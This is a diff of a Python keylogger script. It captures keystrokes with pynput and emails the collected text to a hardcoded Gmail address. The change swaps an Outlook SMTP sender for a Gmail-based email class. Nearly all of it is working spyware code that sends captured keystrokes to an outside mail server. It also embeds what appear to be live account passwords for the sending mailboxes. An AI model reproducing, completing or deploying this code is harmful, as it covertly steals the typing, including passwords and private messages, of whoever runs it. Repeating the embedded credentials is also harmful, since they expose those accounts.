@@ -1,28 +1,23 @@
 import pynput
 from pynput.keyboard import Key, Listener
 import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-user = "testsmtplib.123@outlook.com"
-passwd = "Hellomaycung@312@@123#*"
-from_addr = "testsmtplib.123@outlook.com"
-to_addr = "buitien747@gmail.com"
-smtp_srv = "smtp.live.com"
-def send_mail(message):
-    # create a mail
-    msg = MIMEMultipart()
-    msg['From'] = from_addr
-    msg['To'] = to_addr
-    msg['Subject'] = "KeyLogger Tracking"
 
-    # attach body with message
-    msg.attach(MIMEText(message, 'plain'))
+class emailService:
+    def __init__(self) -> None:
+        pass
+        
+    def send_mail(self,sender_email, sender_password, receiver_email,subject=None,msg=None):
+        smtp = 'smtp.gmail.com'
+        smtp_port = 587
+        session = smtplib.SMTP(smtp, smtp_port)
+        session.starttls()
+        session.login(sender_email,sender_password)
+        session.sendmail(from_addr=sender_email,
+                         to_addrs=receiver_email,
+                         msg=msg)
 
-    # connect to the server and send the email
-    with smtplib.SMTP('smtp-mail.outlook.com', 587) as connection:
-        connection.starttls() 
-        connection.login(user=user, password=passwd)
-        connection.sendmail(from_addr=from_addr, to_addrs=to_addr, msg=msg.as_string())
+count = 0
+keys = []
 
 def email(keys):
     message = ""
@@ -30,11 +25,20 @@ def email(keys):
         k = key.replace("'","")
         if key == "Key.space":
             k = " " 
-        elif key.find("Key")>0:
+        elif key.find("Key") > 0:
             k = ""
         message += k
     print(message)
-    send_mail(message=message)
+
+    email = emailService();
+    print(f"email {email}")
+    email.send_mail(
+        sender_email="pythonsendmail8@gmail.com",
+        sender_password="ymunhhhojswuiaqg",
+        receiver_email="buitien747@gmail.com",
+        subject="Test mail",
+        msg=message
+    )   
 
 def on_press(key):
     # 'A' pressed
